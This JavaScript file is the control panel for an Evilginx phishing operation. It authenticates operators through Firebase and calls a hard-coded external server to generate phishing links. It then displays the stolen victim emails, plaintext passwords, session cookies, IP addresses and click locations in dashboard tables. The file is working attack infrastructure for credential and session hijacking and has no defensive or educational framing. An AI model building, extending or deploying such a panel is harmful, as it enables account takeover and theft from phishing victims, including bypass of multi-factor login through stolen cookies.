console.log("✅ Script.js loaded successfully");

// ✅ Evilginx Server Config (Make sure this URL is correct)
const EVILGINX_SERVER = "http://tecan.com.co:5000";

// ✅ Ensure Firebase is loaded before calling it
document.addEventListener("DOMContentLoaded", () => {
    if (typeof firebase === "undefined") {
        console.error("❌ Firebase is NOT defined. Check firebase-config.js.");
        return;
    }

    checkAuthStatus();
});

// ✅ Check Authentication & Redirect
function checkAuthStatus() {
    firebase.auth().onAuthStateChanged(user => {
        if (user) {
            console.log("✅ User logged in:", user.email);
            if (window.location.pathname.includes("index.html")) {
                window.location.href = "dashboard.html";
            }
        } else {
            console.log("❌ User not logged in.");
            if (window.location.pathname.includes("dashboard.html")) {
                window.location.href = "index.html";
            }
        }
    });
}

// ✅ Login Function
function login() {
    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;

    firebase.auth().signInWithEmailAndPassword(email, password)
        .then(userCredential => {
            console.log("✅ Login successful:", userCredential.user.email);
            window.location.href = "dashboard.html";
        })
        .catch(error => {
            console.error("❌ Login failed:", error.message);
            alert("Login failed: " + error.message);
        });
}

// ✅ Logout Function
function logout() {
    firebase.auth().signOut().then(() => {
        console.log("✅ User logged out.");
        window.location.href = "index.html";
    }).catch(error => {
        console.error("❌ Logout failed:", error.message);
    });
}

// ✅ Generate Evilginx Link
function generateLink() {
    fetch(`${EVILGINX_SERVER}/generate_link`)
        .then(response => response.json())
        .then(data => {
            console.log("✅ Link generated:", data.link);
            alert(`Phishing Link: ${data.link}`);
        })
        .catch(error => {
            console.error("❌ Error generating link:", error);
            alert("Error generating link.");
        });
}

// ✅ Fetch & Display Captured Sessions
function viewCapturedSessions() {
    fetch(`${EVILGINX_SERVER}/captured_sessions`)
        .then(response => response.json())
        .then(data => {
            let tableBody = document.getElementById("capturedSessions");
            tableBody.innerHTML = ""; // Clear previous data
            
            data.forEach(session => {
                let row = `<tr>
                    <td>${session.email}</td>
                    <td>${session.password}</td>
                    <td>${session.cookies}</td>
                    <td>${session.ip}</td>
                </tr>`;
                tableBody.innerHTML += row;
            });

            console.log("✅ Captured sessions loaded successfully.");
        })
        .catch(error => {
            console.error("❌ Error loading captured sessions:", error);
            alert("Error fetching captured sessions.");
        });
}

// ✅ Fetch & Display Captured Cookies
function viewCookies() {
    fetch(`${EVILGINX_SERVER}/captured_cookies`)
        .then(response => response.json())
        .then(data => {
            let tableBody = document.getElementById("capturedCookies");
            tableBody.innerHTML = ""; // Clear previous data
            
            data.forEach(cookie => {
                let row = `<tr>
                    <td>${cookie.domain}</td>
                    <td>${cookie.value}</td>
                    <td>${cookie.expiry}</td>
                </tr>`;
                tableBody.innerHTML += row;
            });

            console.log("✅ Captured cookies loaded successfully.");
        })
        .catch(error => {
            console.error("❌ Error loading cookies:", error);
            alert("Error fetching cookies.");
        });
}

// ✅ Fetch & Display Generated Links History
function viewGeneratedLinks() {
    fetch(`${EVILGINX_SERVER}/generated_links`)
        .then(response => response.json())
        .then(data => {
            let tableBody = document.getElementById("generatedLinks");
            tableBody.innerHTML = ""; // Clear previous data
            
            data.forEach(link => {
                let row = `<tr>
                    <td>${link.url}</td>
                    <td>${link.clicked_location}</td>
                    <td>${link.ip}</td>
                </tr>`;
                tableBody.innerHTML += row;
            });

            console.log("✅ Generated links history loaded successfully.");
        })
        .catch(error => {
            console.error("❌ Error loading generated links history:", error);
            alert("Error fetching generated links history.");
        });
}
